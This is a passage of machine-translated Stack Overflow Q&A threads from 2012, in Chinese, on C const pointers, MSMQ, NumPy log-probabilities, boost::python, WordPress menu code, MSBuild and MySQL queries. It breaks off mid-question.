# c - 指针数组是指针吗？

> ID：11935395
> 
> 赞同：1
> 
> 时间：2012-08-13T13:36:12.010
> 
> 标签：c

有人可以解释以下行：

```
const void *const *ptr; 
```

类型和 Ptr 变量是否都是常量？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:41:15.380

后

```
const void *const *ptr; 
```

你**可以**改变`ptr`，但不能`*ptr`，或者`**ptr`

```
ptr = <SOMETHING_ELSE>; /* ok */
*ptr = <SOMETHING_ELSE>; /* error */
**ptr = <SOMETHING_ELSE>; /* error, ignoring the point that you cannot even have an object of type void */ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:45:12.177

从我的脑海中：

```
void * const var;    // The pointer is constant and var can change
const void * var;    // The pointer can change but not var 
```

所以我认为你的语法

```
const void * const *ptr; 
```

表示 ptr 是指向指针的指针。所以 ptr 将指向一个地址并且该地址不能改变（第一个常量）。ptr 所在的地址也不能改变（第二个常量）。但我对此并不完全确定。

# c# - 从一个端口到 MSMQ 的数据包

> ID：11935399
> 
> 赞同：0
> 
> 时间：2012-08-13T13:36:24.097
> 
> 标签：c#, .net, msmq

我是 MSMQ 的新手。我们有很多 c# 应用程序（.exe）在一个端口上发送数据包的情况。他们可以将数据包发送到一个端口。如何将 MSMQ 配置为自动从端口读取并将这些数据包发布到 MSMQ。我们不能丢失任何这些数据包，因此根本不能接受数据丢失。如何有效地做到这一点。能否将 MSMQ 配置为接受来自端口 1801 的数据包。如果我们将这些应用程序写入不同的端口会更好吗？如果他们写入一个端口，如何将这些消息直接发送到 MSMQ 而不会丢失数据。我们希望队列是事务性的。我们不想使用到达的数据包。

请帮忙 。任何可以完成此任务的示例代码都会有很大帮助。

请注意，应用程序是用 C# .NET 编写的。数据丢失和性能缓慢一直是一个问题，我们正在尝试使用 MSMQ 解决这些问题。我们必须在 MSMQ 中查看来自这些应用程序的所有数据包。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:01:32.260

*如何将 MSMQ 配置为自动从端口读取*

除非您准备编写代码，否则我认为这是不可能的。因此，假设您不介意自己编写一点代码，请查看[System.Messaging.Message](http://msdn.microsoft.com/en-us/library/system.messaging.message.aspx)类。Body 属性允许您发送字节数组。

因此，只要您从端口读取某种字节数组，将其放入消息中应该是轻而易举的事。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T09:55:17.300

> *如何有效地做到这一点。是否可以将 MSMQ 配置为接受来自端口 1801 的数据包。如果我们将这些应用程序写入不同的端口会更好吗？*

1801 已经是MSMQ **TCP数据包的****默认端口**，请参阅 MSDN 文章[TCP 端口、UDP 端口和消息队列使用的 RPC 端口](http://support.microsoft.com/kb/178517)。

 **如果您的端口号确实很重要，您可以将 WCF 服务配置为在其`address`服务配置部分中侦听某些端口。

使用 MSMQ 时，您通常不必处理任何特殊端口，除非通过防火墙配置多个网络之间的通信（MSDN 文章：[如何为 MSMQ 访问配置防火墙](http://support.microsoft.com/kb/183293)）。

如果可能的话，我会建议坚持使用默认值。

> *如何将这些消息直接发送到 MSMQ 而不会丢失数据。我们希望队列是事务性的。*

如果您使用事务队列，您可以自动保护消息以防止数据丢失。在 WCF中[排队](http://msdn.microsoft.com/en-us/library/ms789048.aspx)和[使用 MSMQ 和 .NET 进行可靠消息传递中的更多信息](http://msdn.microsoft.com/en-us/library/ms978430.aspx)

> *数据丢失和性能缓慢一直是一个问题，我们正在尝试使用 MSMQ 解决这些问题。我们必须在 MSMQ 中查看来自这些应用程序的所有数据包。*

MSMQ 本身既快速又轻巧，但与所有其他工具一样，这完全取决于您使用它做什么以及如何使用它。如果您开始发送大数据包，MSMQ 也可能会遇到麻烦。请记住，MSMQ 有一些限制，例如[消息大小](http://blogs.msdn.com/b/johnbreakwell/archive/2007/08/22/why-is-there-a-4mb-limit-on-msmq-messages.aspx)。

以下是帮助您开始**结合使用 WCF 和 MSMQ**的文章/教程：

*   MSDN：[MSMQ 和 WCF：入门](http://blogs.msdn.com/b/motleyqueue/archive/2009/05/31/msmq-and-wcf-getting-started.aspx)
*   [Windows Communication Foundation 的消息队列](http://msdn.microsoft.com/en-us/library/ms751490)
*   具有安全通信的更完整方案：[使用 MSMQ 通信和证书安全创建 WCF 服务](http://www.codeproject.com/Articles/326909/Creating-a-WCF-Service-with-MSMQ-Communication-and)（代码项目）**

# php - 基本数据库连接模板 PHP MySQL

> ID：11935411
> 
> 赞同：-3
> 
> 时间：2012-08-13T13:37:08.403
> 
> 标签：php, mysql

我有一个网站，我们希望能够从数据库中读取数据，并根据下拉框的标准为用户提供资源列表（例如，如果您住在阿拉斯加，则为您提供阿拉斯加资源）。我对基本的编程结构足够熟悉，但对 PHP 本身并不熟悉。有没有人知道的好的，惯用的教程；一些或多或少的即插即用的东西，其中基本的注释很好，我可以更改连接字符串并自己构建实际的数据库？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:59:19.603

我将推荐使用 PDO 扩展，还有其他选择，例如带有大量示例的 mysqli。我建议查看[PDO 的 PHP 手册，](http://php.net/manual/en/book.pdo.php)以了解它在做什么。一个快速的 google 想出了[DB wrapper 类](http://code.google.com/p/php-pdo-wrapper-class/)，它应该足以让你继续前进。（我没有使用它，但它看起来很简单）。

# numpy - 使用 NumPy 避免联合概率的下溢

> ID：11935412
> 
> 赞同：4
> 
> 时间：2012-08-13T13:37:11.137
> 
> 标签：numpy, underflow

我面临一个问题，即在简单的设置中估计自变量的联合概率。目前我有一个包含 100 个随机变量的数组，我想在不陷入下溢问题的情况下获得它们的联合概率。任何想法如何在 numpy 中实现这一目标？如果可能的话？

如果没有，请向我进一步解释 NumPy 例程（logaddexp）的作用，因为我认为在这种情况下它可能对我有帮助。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-13T14:38:37.050

`logaddexp`*允许您通过存储和处理*对数来扩展可表示值的范围（降低精度） 。

```
e1, e2 = np.log(p1), np.log(p2)    # convert p1, p2 to log form
e1e2 = e1 + e2                     # e1e2 is now np.log(p1 * p2)
e3 = np.logaddexp(e1, e2)          # e3 = np.log(p1 + p2) 
```

您只需要将代码更改`**`为`*`、和`*`，并在最后转换回 with 。`+``+``np.logaddexp``np.exp`

正常的 64 位双精度浮点具有最小正正常值 2.2E-308；存储日志可以为您提供有效的最小正数正常 1E-(1.7E308)。

# python - 使用boost python将C结构作为numpy数组传递给python

> ID：11935413
> 
> 赞同：2
> 
> 时间：2012-08-13T13:37:14.237
> 
> 标签：python, boost, numpy

我正在尝试使用 boost::python 将 C 结构从 C++ 传递到 python 作为 numpy 数组。我知道有更简单的方法可以将 C 结构传递给 python，但我想使用 numpy 数组的原因是解决方案是反射模型的一部分，因此需要从字符串动态生成数据类型。

我可以序列化将其作为字符串传递给 python 的结构，并在 python 中调用 numpy.fromstring() ，它成功地将其转换为 numpy 数组。但是，这不是很有效，因为将其转换为字符串会复制数据，而不是通过引用将其传递给 python。

例如：

```
#include <boost/python.hpp>

using namespace boost::python;

struct MyRecord
{
    uint32_t myInt;
    char myString[4];
    double myDouble;
};

class MyBaseClass
    :   public wrapper<MyBaseClass>
{
public:
    void myCallback(const MyRecord& data)
    {
        object func = get_override("myCallback");
        if (func) {
            std::string dataStr(reinterpret_cast<const char*>(data), sizeof(data));
            func(dataStr, "[('myInt','<u4'),('myString','|S4'),('myDouble','<f8')]");
        }
    }
};

BOOST_PYTHON_MODULE(example1)
{
    class_<MyBaseClass>("MyBaseClass")
        .def("myCallback", &MyBaseClass::myCallback);
} 
```

* * *

```
#!/usr/bin/env python

import numpy
from example1 import MyBaseClass

class MyClass(MyBaseClass):
    def myCallback(self, dataStr, dtypeStr):
        dt = numpy.dtype(eval(dtypeStr))
        data = numpy.fromstring(dataStr, dt)
        print data # This is now a numpy array 
```

* * *

我真正想做的是将结构转换为 C++ 中的 numpy 数组，并通过引用直接将其传递给 python。

我已经尝试过 boost::python::numeric::array 类，但是在将 C++ 类型转换为 numpy 数组时遇到了问题。构造函数抛出：“TypeError: No to_python (by-value) converter found for C++ type: MyRecord”

有一些示例代码：

```
#include <boost/python.hpp>
#include <boost/python/exec.hpp>
#include <boost/python/numeric.hpp>

using namespace boost::python;

struct MyRecord
{
    uint32_t myInt;
    char myString[4];
    double myDouble;
};

class MyBaseClass
    :   public wrapper<MyBaseClass>
{
public:
    void myCallback(const MyRecord& data)
    {
        object func = get_override("myCallback");
        if (func) {
            object dtype = exec("eval(\"[('myInt','<u4'),('myString','|S4'),('myDouble','<f8')]\")");
            func(numeric::array(data, dtype));  // numeric::array throws
        }
    }
};

BOOST_PYTHON_MODULE(example2)
{
    class_<MyBaseClass>("MyBaseClass")
        .def("myCallback", &MyBaseClass::myCallback);
} 
```

* * *

```
#!/usr/bin/env python

import numpy
from example2 import MyBaseClass

class MyClass(MyBaseClass):
    def myCallback(self, data):
        print data # This is a numpy array passed from C++ 
```

* * *

谢谢，

保罗

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-16T17:45:41.153

好的，我已经设法回答了我自己的问题。这不是直截了当的，但它现在有效......

```
#include <numpy/arrayobject.h>

void MyBaseClass::myCallback(const MyRecord& data)
{
    object func = get_override("myCallback");
    if (func) {
        PyArray_Descr* dtype;
        PyObject* op = Py_BuildValue("[(s,s),(s,s),(s,s)]", "myInt", "<u4", "myString", "|S4", "myDouble", "<f8");
        PyArray_DescrConverter(op, &dtype);
        Py_DECREF(op);
        PyObject* pya = PyArray_FromString(const_cast<char*>(reinterpret_cast<const char*>(&data)), sizeof(data), dtype, 1, NULL);
        // PyObject_Print(pya, stdout, 0);
        numeric::array bpa(static_cast<numeric::array>(handle<>(pya)));
        func(bpa);
    }
}

BOOST_PYTHON_MODULE(example3)
{
    import_array()
    class_<MyBaseClass>("MyBaseClass")
        .def("myCallback", &MyBaseClass::myCallback);
} 
```

再次感谢，

保罗

# java - 编写 AWT 小部件

> ID：11935415
> 
> 赞同：0
> 
> 时间：2012-08-13T13:37:22.720
> 
> 标签：java, widget, awt

我担心我只是提出了一个重复十次的问题，但是我一直在尝试用谷歌搜索这个很长一段时间，但没有找到任何东西，无论是一般情况下，甚至在 SO 上都没有，所以我开始认为这是值得的射击。

我想知道，是否有关于在 Java 中实现 AWT 小部件所需的良好指南？为了以适当的方式响应重绘、调整大小、放置、焦点行为以及小部件可能或应该做的所有其他事情，需要实现什么？我设法找到的所有文章都从小部件用户的角度描述了该过程，而不是从实现它们的角度。

此外，实现 AWT 小部件和实现 Swing 小部件之间的主要区别是什么？从实施者的角度来看甚至有区别吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:20:37.900

学习如何编写 AWT 小部件的最佳方式可能是查看 AWT 小部件的源代码。这是[java.awt.Frame](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b14/java/awt/Frame.java)类的源代码。

我与 AWT 的合作不多，但从 GUI 开发人员的角度来看，Swing 要好得多。从实现者的角度来看，我所知道的唯一区别是 Swing 对侦听器的使用。

同样，您可以查看源代码以了解有什么不同。[这是javax.swing.JFrame](http://fuseyism.com/classpath/doc/javax/swing/JFrame-source.html)类的源代码

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-22T16:17:56.430

除了 AWT 小部件更简单之外，没有太大区别。

您扩展了 4 个类之一：Component、Container、Canvas、Panel。前两个是重量级的，后两个是轻量级的（没有本地窗口系统对等）。覆盖paint(Graphics)（或update()）和getPreferredSize() 使其可见，然后查看javadocs 以获取覆盖事件处理方法。

当然你知道这个链接，[http://docs.oracle.com/javase/6/docs/api/java/awt/Component.html](http://docs.oracle.com/javase/6/docs/api/java/awt/Component.html)

# google-apps-script - 如何使用 ContentService 和 doPost 创建 REST API

> ID：11935420
> 
> 赞同：1
> 
> 时间：2012-08-13T13:37:39.413
> 
> 标签：google-apps-script

我想让 myFunction() 发送一个负载，该负载将由 doPost 处理并根据负载返回一些内容。我只能让这些测试脚本在以下任一情况下工作：

a) 使用 doGet()，不传递有效载荷，而是按预期返回输出。

或者

b) 使用 doPost()，传递有效负载但得到 405 代码而不是输出。

我错过了什么？

```
function doPost(e) {
  var ss = SpreadsheetApp.openById('<spreadsheet id for recording parameters>');
  var sheet = ss.getSheets()[0];
  var record;
  for (var i in e.parameters) {
    record = 'parameter: ' + i + ' = ' + e.parameters[i];
    sheet.getRange(sheet.getLastRow() + 1, 1, 1, 1).setValue(record);
  }
  var output = ContentService.createTextOutput();
  output.setContent("content to return");
  return output;
}

function myFunction() {
  var url = '<url of above script webapp, set to anonymous, anyone>';
  var payload = {payloadToSend : 'string to send'};
  var method = 'post'
  var response = UrlFetchApp.fetch(url, {method : method, payload: payload}).getContentText();
  Logger.log(response);
  return;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T22:03:12.640

问题似乎是提供 ContentService 内容的域“script.googleusercontent.com”不允许使用 POST 方法。当您的 doPost() 处理程序返回 TextOuput 时，它会将重定向发送回客户端，这会导致客户端再次将 POST 发送到 script.googleusercontent.com，这是不允许的。

如果您可以使用 GET，那么这将是推荐的解决方案。如果没有，您可能需要将工作分成两部分：首先 POST 没有响应，然后 GET 以检索响应。

**更新**：截至 2012 年 9 月 21 日，此问题现在应该已修复，您可以 POST 到 URL 而不会出现任何错误。

# c++ - Windows 7 64 位中的 OpenCV 2.4 错误 0xc0000005

> ID：11935422
> 
> 赞同：0
> 
> 时间：2012-08-13T13:37:43.113
> 
> 标签：c++, windows, opencv, 64-bit

我在我的 windows 7 64 位中使用 CodeBlocks，我使用 MinGw 作为我的默认 c/c++ 编译器。

几天前我需要使用 OpenCV，在我遇到了很多错误之后，我得到了这样的无法解决的错误：

[![图像](../Images/ef2fabcc924669e149ff501bdbc7582d.png)](https://i.stack.imgur.com/eqpGf.png)

[![img2](../Images/acc6ca279591a97bf7e336ce929f850f.png)](https://i.stack.imgur.com/jN6db.png)

示例代码：

```
#include "cv.h"
#include "highgui.h"

int main( int argc, char** argv ) {
    IplImage* img = cvLoadImage( argv[1] );
    cvNamedWindow( "Example1", CV_WINDOW_AUTOSIZE );
    cvShowImage( "Example1", img );
    cvWaitKey(0);
    cvReleaseImage( &img );
    cvDestroyWindow( "Example1" );
} 
```

我相信我的链接和目录设置是正确的。所以请帮助我:)我即将放弃:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T03:59:15.167

假设您在代码和图像中所做的一切都是正确的，这可能是由于不兼容的 opencv 二进制文件而导致的问题。

请看[一个类似的安装](http://seevisionc.blogspot.co.uk/2011/09/linux-like-installation-of-opencv-230.html)来编译，看看它是否有效。我在安装中遇到了类似的问题，通过再次编译二进制文件来解决这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T13:16:27.247

问题很可能是加载图像时失败。但是只有在检查以下内容时，您才能确定`cvLoadImage()`：

```
IplImage* img = cvLoadImage( argv[1] );
if (!img)
{
    printf("!!! cvLoadImage failed\n");
} 
```

如果不支持图像格式，或者在指定位置找不到图像，则该函数将失败。

您的应用程序希望加载从命令行传递的文件，因此您最好使用以下命令执行您的应用程序：`Main.exe C:\some_img.png`

您还可以在代码中硬编码文件名：

```
IplImage* img = cvLoadImage("C:\\some_img.png");
if (!img)
{
    printf("!!! cvLoadImage failed\n");
} 
```

# php - 如何在 WordPress 中使用 wp_get_nav_menu_items 生成自定义菜单/子菜单系统？

> ID：11935423
> 
> 赞同：44
> 
> 时间：2012-08-13T13:37:43.330
> 
> 标签：php, wordpress, menu, wordpress-theming, submenu

我有一个需要自定义`wp_nav_menu`代码的 html 结构。

这是我需要生成的html：

```
<ul class="main-nav">
    <li class="item">
        <a href="http://example.com/?p=123" class="title">Title</a>
        <a href="http://example.com/?p=123" class="desc">Description</a>
        <ul class="sub-menu">
            <li class="item">
                <a href="http://example.com/?p=123" class="title">Title</a>
                <a href="http://example.com/?p=123" class="desc">Description</a>
            </li>
        </ul>
    </li>
     <li class="item">
        <a href="http://example.com/?p=123" class="title">Title</a>
        <a href="http://example.com/?p=123" class="desc">Description</a>
    </li>
</ul> 
```

我目前正在使用`wp_get_nav_menu_items`从我的菜单中获取所有项目作为数组。

现在，我可以使用以下代码在**没有子菜单的情况下生成上述 html：**

```
<?php

$menu_name = 'main-nav';
$locations = get_nav_menu_locations()
$menu = wp_get_nav_menu_object( $locations[ $menu_name ] );
$menuitems = wp_get_nav_menu_items( $menu->term_id, array( 'order' => 'DESC' ) );

foreach ( $menuitems as $item ):

    $id = get_post_meta( $item->ID, '_menu_item_object_id', true );
    $page = get_page( $id );
    $link = get_page_link( $id ); ?>

    <li class="item">
        <a href="<?php echo $link; ?>" class="title">
            <?php echo $page->post_title; ?>
        </a>
        <a href="<?php echo $link; ?>" class="desc">
            <?php echo $page->post_excerpt; ?>
        </a>
    </li>

<?php endforeach; ?> 
```

我会使用该`wp_nav_menu`功能生成菜单，但我仍然需要使用`$page->post_excerpt`.

我发现每个被调用的项目都有一个属性，`$item->menu_item_parent`它给出了父菜单项的 ID。

如何在`foreach`循环中生成子菜单？还是有一种`wp_nav_menu`Google 忘记提及的非常简单的方法？

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2012-08-14T08:18:41.417

对于任何解决类似问题的人，这是我的解决方案：

## 要点上的快速代码示例

[这是 github gist 上的代码](https://gist.github.com/4345363)，供任何想要参与复制粘贴操作的人使用。

## TL;博士

TL;DR 循环列表，如果有子菜单则向下钻取，如果到达子菜单和菜单的末尾则关闭。

## 完整的代码解释

首先将菜单项作为平面数组获取：

```
<?php
$menu_name = 'main_nav';
$locations = get_nav_menu_locations();
$menu = wp_get_nav_menu_object( $locations[ $menu_name ] );
$menuitems = wp_get_nav_menu_items( $menu->term_id, array( 'order' => 'DESC' ) );
?> 
```

然后遍历菜单项数组：

```
<nav>
<ul class="main-nav">
    <?php
    $count = 0;
    $submenu = false;

    foreach( $menuitems as $item ):
        // set up title and url
        $title = $item->title;
        $link = $item->url;

        // item does not have a parent so menu_item_parent equals 0 (false)
        if ( !$item->menu_item_parent ):

        // save this id for later comparison with sub-menu items
        $parent_id = $item->ID;
    ?> 
```

写第一个父项`<li>`：

```
 <li class="item">
        <a href="<?php echo $link; ?>" class="title">
            <?php echo $title; ?>
        </a>
    <?php endif; ?> 
```

检查此项目的父 ID 是否与存储的父 ID 匹配：

```
 <?php if ( $parent_id == $item->menu_item_parent ): ?> 
```

启动子菜单`<ul>`并将`$submenu`flag 设置为 true 以供以后参考：

```
 <?php if ( !$submenu ): $submenu = true; ?>
            <ul class="sub-menu">
            <?php endif; ?> 
```

编写子菜单项：

```
 <li class="item">
                    <a href="<?php echo $link; ?>" class="title"><?php echo $title; ?></a>
                </li> 
```

如果下一项没有相同的父 id 并且我们声明了一个子菜单，则关闭子菜单`<ul>`

```
 <?php if ( $menuitems[ $count + 1 ]->menu_item_parent != $parent_id && $submenu ): ?>
            </ul>
            <?php $submenu = false; endif; ?>

        <?php endif; ?> 
```

同样，如果数组中的下一项没有相同的父 ID，则关闭`<li>`

```
 <?php if ( $menuitems[ $count + 1 ]->menu_item_parent != $parent_id ): ?>
    </li>                           
    <?php $submenu = false; endif; ?>

<?php $count++; endforeach; ?>

  </ul>
</nav> 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-08-13T14:11:04.547

您最好的选择是创建自己的 Walker 类，以根据您的需要定制输出。像这样的东西：

```
class Excerpt_Walker extends Walker_Nav_Menu
{
    function start_el(&$output, $item, $depth, $args)
    {
        global $wp_query;
        $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

        $class_names = $value = '';

        $classes = empty( $item->classes ) ? array() : (array) $item->classes;
        $classes[] = 'menu-item-' . $item->ID;

        $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
        $class_names = ' class="' . esc_attr( $class_names ) . '"';

        $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
        $id = strlen( $id ) ? ' id="' . esc_attr( $id ) . '"' : '';

        $output .= $indent . '<li' . $id . $value . $class_names .'>';

        $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
        $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
        $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
        $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

        $item_output = $args->before;
        $item_output .= '<a'. $attributes .'>';

        $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;

        /*GET THE EXCERPT*/
        $q = new WP_Query(array('post__in'=>$item->object_id));
        if($q->have_posts()) : while($q->have_posts()) : $q->the_post();
            $item_output .= '<span class="menu-excerpt">'.get_the_excerpt().'</span>';
        endwhile;endif;
        /*****************/

        $item_output .= '</a>';
        $item_output .= $args->after;

        $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
    }
} 
```

然后这样称呼它：

```
<?php
wp_nav_menu(array('walker' => new Excerpt_Walker()));
?> 
```

在我的示例中，GET THE EXCEPT 标记之前和之后的所有内容都是 wp-includes/nav-menu-template.php 中 start_el 函数的直接副本。我的示例使用 WP_Query 来确定帖子/页面是否有摘录，并将摘录放在链接标题之后的 span 标签之间。

一个想法是让 span 标签仅在悬停时出现，这可以使用 CSS 来完成。

有关步行者的更多信息，请点击此处：

[WP 导航菜单法典](http://codex.wordpress.org/Function_Reference/wp_nav_menu)

[使用 Walker 类](https://wordpress.stackexchange.com/questions/14037/menu-items-description-custom-walker-for-wp-nav-menu/14039#14039)

[另一个使用 Walker 类的好例子](http://shinraholdings.com/62/custom-nav-menu-walker-function/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-28T06:12:27.653

```
 //Just set your variable and apply.. for sub menu
     <ul>
     <?php

     $activeclass = '';
    $activeclass1='';
     $count=0;
    $submenu = FALSE;
    foreach ( $primaryNav as $navItem ) {
            $activeclass = '';  
         if($navItem->object_id == $getid){
            $activeclass = 'class="live-act"';
         }
         if (!$navItem->menu_item_parent ){
            $parent_id = $navItem->ID;
        echo '<li><a href="'.$navItem->url.'" '.$activeclass.'   title="'.$navItem->title.'">'.$navItem->title.'</a>';
         }
         ?>
        <?php if ( $parent_id == $navItem->menu_item_parent ) { ?>
      <?php if ( !$submenu ): $submenu = true; ?>
        <ul>
        <?php endif; ?>
             <li>
                <a href="<?php echo $navItem->url; ?>" class="title"><?php echo $navItem->title; ?></a>
            </li>
       <?php if ( $primaryNav[ $count + 1 ]->menu_item_parent != $parent_id && $submenu ){ ?>
        </ul>
        <?php $submenu = false; 
       }
        ?>
        <?php }
         if ( $primaryNav[ $count + 1 ]->menu_item_parent != $parent_id ){ ?>
        </li>                            
            <?php $submenu = false; } ?>

        <?php $count++;   ?>

        <?php } ?>
         </ul> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-07-29T09:50:49.913

**完整的代码解释......**

首先在functions.php文件中创建两个下面两个函数

```
 function get_menu_id( $location ){
                //get all the location....
                $locations =get_nav_menu_locations();

                //get object id by location.....
                $menu_id = $locations[$location];

                return !empty($menu_id) ? $menu_id : '';
            }

            function get_child_menu_items($menu_array , $parent_id){
                $child_menu = [];
                if(!empty($menu_array) && is_array($menu_array)){
                    foreach($menu_array as $menu){
                        if( intval($menu->menu_item_parent) === $parent_id){
                            array_push($child_menu , $menu);
                        }
                    }
                }
                return $child_menu;
            } 
```

然后

```
$menu_name = 'menu_name';
                $location = get_nav_menu_locations();
                $menu = wp_get_nav_menu_object($location[$menu_name]);
                $menuitems = wp_get_nav_menu_items( $menu->term_id);
                $header_menu_id = get_menu_id('primary-menu');

                $header_menus = wp_get_nav_menu_items($header_menu_id); 
```

现在这是我的 html 和 php 代码....

```
<div class="collapse navbar-collapse" id="navbarSupportedContent">

                    <?php
                        if(!empty($header_menus)  && is_array($header_menus)){
                            ?>
                            <ul class="navbar-nav ml-auto">
                                <?php
                                    foreach($header_menus as $menu_item){
                                        if(!$menu_item->menu_item_parent){ //checking the item are parent?
                                            $child_menu_items = get_child_menu_items($header_menus, $menu_item->ID);
                                            $has_children = !empty($child_menu_items) && is_array($child_menu_items);

                                            if(! $has_children){
                                                ?>
                                                <li class="nav-item">
                                                    <a class="nav-link" href="<?php echo esc_url($menu_item -> url); ?>"> <?php echo esc_html($menu_item->title); ?></a> 
                                                </li>
                                                <?php
                                            }else{
                                                ?>
                                            <li class="nav-item dropdown">
                                                <a class="nav-link dropdown-toggle" href="<?php echo esc_url($menu_item -> url); ?>" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                                <?php echo esc_html($menu_item->title); ?>
                                                </a>
                                                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                                                    <?php
                                                        foreach($child_menu_items as $child){
                                                            ?>
                                                            <a class="dropdown-item" href="<?php echo esc_url($child->url); ?>" > <?php echo esc_html($child->title); ?></a> 
                                                            <?php
                                                        }
                                                    ?>        
                                                </div>
                                            </li>
                                                <?php
                                            }
                                        }
                                    }
                                ?>
                            </ul>
                            <?php
                        }
                    ?> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-10-07T03:28:20.367

请试试这个。这个对我有用。

```
<?php
        $menuLocations = get_nav_menu_locations();
        $menuID = $menuLocations['primary'];
        $menu = wp_get_nav_menu_object($menuLocations['primary']);
        $menuitems = wp_get_nav_menu_items($menu->term_id, array('order' => 'DESC'));
        $ParentArray = array();
        $count = 0;
        $submenu = false;

    foreach ($menuitems as $menu_item) {
        $link = $menu_item->url;
        $title = $menu_item->title;
        if ($menu_item->menu_item_parent == 0   ) {
            $parent_id = $menu_item->ID;
            echo  '<li class="main-li dropmenu"><a href="' .$menu_item->url . '">'.$menu_item->title .'</a>';
        }
        if ($parent_id == $menu_item->menu_item_parent ) {
            if (!$submenu ) {
                $submenu = true;
                echo '<ul class="level1">';
            }
             echo '<li><a href="'.$link.'">'.$title.'</a></li>';
            if ($menuitems[ $count + 1 ]->menu_item_parent != $parent_id && $submenu ) {
                echo '</ul>';
                $submenu = false;
            }
        }
        if ($menuitems[ $count + 1 ]->menu_item_parent != $parent_id ) {
            echo '</li>';
            $submenu = false;
        }
        $count++;
    }
    ?> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-10-14T19:05:10.890

如果您的主题`has_nav_menu('<menu-name>')`在`header`or中使用`footer.php`（例如），您可以转到 `Appearance > Menus`并选择要配置的**菜单**或**子菜单**。

# visual-studio - 从 MSBuild 项目中检测 Visual Studio 版本

> ID：11935426
> 
> 赞同：9
> 
> 时间：2012-08-13T13:37:48.840
> 
> 标签：visual-studio, msbuild

[BuildingInsideVisualStudio](http://msdn.microsoft.com/en-us/library/ms171468.aspx)属性提供了检测项目是否在 Visual Studio 中构建的能力。

有什么方法可以确定正在使用哪个版本的 Visual Studio？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T17:40:53.500

使用 VisualStudioVersion 属性。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-15T09:14:30.640

由于评论没有格式化，这里的调查显示 fsimonazzi 是正确的。在 2008 年，未设置 VisualStudioVersion。在 2010 年（可能会更高）它是。

在 VS2008 中创建了一个项目，之后添加了以下内容`<Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />`：

```
<Target Name="PrintVisualStudioInfo">
  <Message Text="VisualStudioVersion: '$(VisualStudioVersion)'" />
</Target>
<PropertyGroup>
  <CompileDependsOn>
    PrintVisualStudioInfo;
    $(CompileDependsOn)
  </CompileDependsOn>
</PropertyGroup> 
```

将 VS2008 输出调至正常。结果：

```
Target PrintVisualStudioInfo:
    VisualStudioVersion: '' 
```

在 VS2010 结果上：

```
PrintVisualStudioInfo:
   VisualStudioVersion: '10.0' 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-30T09:21:46.000

根据[这篇文章](http://blogs.msdn.com/b/webdev/archive/2012/08/22/visual-studio-project-compatability-and-visualstudioversion.aspx)，该属性从 VS2012 开始存在。它是在`Microsoft.Common.targets`安装 .NET 4.5 时在文件中定义的（检查原始 .NET 4.0 没有定义该属性）。

# newsletter - 如何在时事通讯中在移动设备上拨打电话号码？

> ID：11935433
> 
> 赞同：0
> 
> 时间：2012-08-13T13:38:12.957
> 
> 标签：newsletter, electronic-direct-mail

这些是我尝试将表结构用于时事通讯的各种选项。我的问题是，点击移动设备上的电话号码，它会重定向到一个新页面，其 url 中有 callto 或 tel，而在浏览器中它会重定向到一个空白页面。帮我解决这个问题。

```
<a href="tel:9865551555">9865551555</a>
<a href="callto:9865551555">9865551555</a> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-05-05T03:51:33.263

一定要包括国家代码。[本教程](http://webdesign.tutsplus.com/articles/quick-tip-make-telephone-numbers-do-something--webdesign-9271)中的格式对我来说效果很好。

```
<a href="tel:+19865551555">(986) 555-5155</a> 
```

# php - php中的mysql一对多查询

> ID：11935436
> 
> 赞同：0
> 
> 时间：2012-08-13T13:38:27.220
> 
> 标签：php, mysql

我正在尝试检索父记录，然后从 MySQL DB 检索 PHP 中该记录的匹配子记录。

父表

```
ISN|ParentName|JoinedDate
1  |John      |01-01-2010
2  |Sam       |02-02-2010
3  |Sheila    |13-08-2012 
```

子表

```
ISN|ChildName|JoinDate
1 |Mary      |10-10-2010
1 |Tamsin    |11-10-2010
3 |Kyle      |11-12-2010 
```

查询结果应如下所示：

```
1|John  |Parent|01-01-2010
1|Mary  |Child |10-10-2010
1|Tamsin|Child |11-10-2010
2|Sam   |Parent|02-02-2010
3|Sheila|Parent|13-08-2012
